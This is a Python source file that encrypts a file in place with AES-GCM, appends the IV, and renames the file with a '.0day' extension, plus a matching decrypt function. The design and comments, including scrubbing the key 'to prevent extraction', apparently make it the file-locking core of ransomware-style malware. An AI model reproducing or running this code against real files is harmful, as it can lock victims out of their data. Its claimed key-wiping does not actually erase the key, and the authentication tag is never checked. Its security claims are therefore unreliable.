from Cryptodome.Cipher import AES     # Pyryptodomex has been used to prevent any
from Cryptodome import Random         # collision with Pycrypto/Pycryptodome packages.
import hashlib                        # Use pip (or conda) install cryptodomex.
import os

def writer(filepath, method, append_iv=None):
  
  """
  This function will take the filepath and write
  new message as provided by the *method* in-place.
  If *append_iv* is given, the Initialization Vector
  will be appended to the end of the file. And also it randomly 
  generates false keys to prevent extraction of original keys.
  """
  
  path = os.path.normpath(filepath)
  with open(path, 'rb+') as fh:
    for line in fh:
      new_line = method(line)
      fh.seek(-len(line), 1)
      fh.write(new_line)
    if append_iv:
      fh.seek(0,2)
      fh.write(append_iv)


def encrypt(filepath, key):
  
  """
  This function will encrypt the contents of file,
  provided the *filepath* . The writer function 
  helps it achieve the goal. Finally it appends the
  Initialization vector *iv* at the end.
  
  And as a final touch, it adds a sweet '.0day' extension
  at the end of the file. And also it randomly generates false keys
  to prevent extraction of original keys.
  
  Note: Encrypt may perform slow on large files, but decryption spped
        is not affected (which is very suspicious). The decrypted files
        are returned in perfect state.
  """
  
  path = os.path.normpath(filepath)
  ext = '.0day'
  
  try:
    keyb = hashlib.sha3_256(key.encode()).digest()
    iv = Random.new().read(AES.block_size)
    cipher_gcm = AES.new(keyb, AES.MODE_GCM, iv)
    
    writer(path, cipher_gcm.encrypt, append_iv=iv)
    
    os.rename(path, path+ext)
    
    for _ in range(100): keyb = os.urandom(16)
  except FileNotFoundError:
    pass
  

def decrypt(filepath, key):
  """
  This function will decrypt the contents of file,
  provided the *filepath* . The writer function 
  helps it achieve the goal. It extracts the Initialization
  Vector *iv* from the end of the file.
  
  And to keep things cool, it returns the original file by
  removing the '.0day' extension.
  """
  
  path = os.path.normpath(filepath)
  ext = '.0day'
  
  if not path.endswith(ext):
    return 'Unsupported file'
  
  try:
    with open(path, 'rb+') as f:
      original_size = os.path.getsize(path) - 16
      f.seek(-16, 2)
      iv = f.read(16)
      f.truncate(original_size)
    
    keyb = hashlib.sha3_256(key.encode()).digest()
    cipher_gcm = AES.new(keyb, AES.MODE_GCM, iv)
    
    writer(path, cipher_gcm.decrypt)
    
    original_path = os.path.splitext(path)[0]
    
    os.rename(path, original_path)
    
    for _ in range(100): keyb = os.urandom(16)
  except FileNotFoundError:
    pass
